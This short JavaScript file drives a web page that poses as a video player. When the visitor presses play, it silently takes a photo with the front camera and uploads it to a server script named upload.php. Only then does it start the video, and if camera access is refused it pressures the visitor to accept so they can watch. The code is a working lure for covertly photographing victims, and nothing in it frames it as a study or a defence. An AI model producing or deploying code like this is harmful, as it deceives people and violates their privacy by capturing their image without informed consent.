const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');

playButton.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const blob = await imageCapture.takePhoto();
        
        stream.getTracks().forEach(track => track.stop());
        
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        await fetch('upload.php', { method: 'POST', body: formData });
        
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        setTimeout(() => {
            loader.style.display = 'none';
            video.controls = true;
            video.play();
        }, 2000);
        
    } catch (error) {
        alert('Camera permission denied. Please accept to watch the video.');
    }
});
